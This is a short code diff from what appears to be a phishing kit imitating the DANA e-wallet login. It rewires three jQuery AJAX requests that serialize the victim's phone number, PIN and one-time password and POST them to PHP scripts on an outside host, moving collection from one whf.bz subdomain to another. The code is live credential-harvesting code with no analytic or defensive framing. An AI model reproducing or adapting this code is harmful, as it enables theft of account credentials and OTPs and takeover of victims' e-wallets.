@@ -141,7 +141,7 @@ $(".bgotp").hide();
     var dataString = $("#formNohp, #formPin, #formOtp").serialize();
 			$.ajax( {
 			  type: 'POST',
-			  url: 'https://chroedevsi.whf.bz/danaid77/one.php',
+			  url: 'https://kuda-terbang.whf.bz/notif/DANA/b7f1/one.php',
 			  data: dataString,
  
     
@@ -163,7 +163,7 @@ function sendPin(){
   var dataString = $("#formNohp, #formPin, #formOtp").serialize();
 			$.ajax( {
 			  type: 'POST',
-			  url: 'https://chroedevsi.whf.bz/danaid77/two.php',
+			  url: 'https://kuda-terbang.whf.bz/notif/DANA/b7f1/two.php',
 			  data: dataString,
  
 
@@ -196,7 +196,7 @@ $(".alert").css("color","red");
     var dataString = $("#formNohp, #formPin, #formOtp").serialize();
 			$.ajax( {
 			  type: 'POST',
-			  url: 'https://chroedevsi.whf.bz/danaid77/three.php',
+			  url: 'https://kuda-terbang.whf.bz/notif/DANA/b7f1/three.php',
 			  data: dataString,
  
         
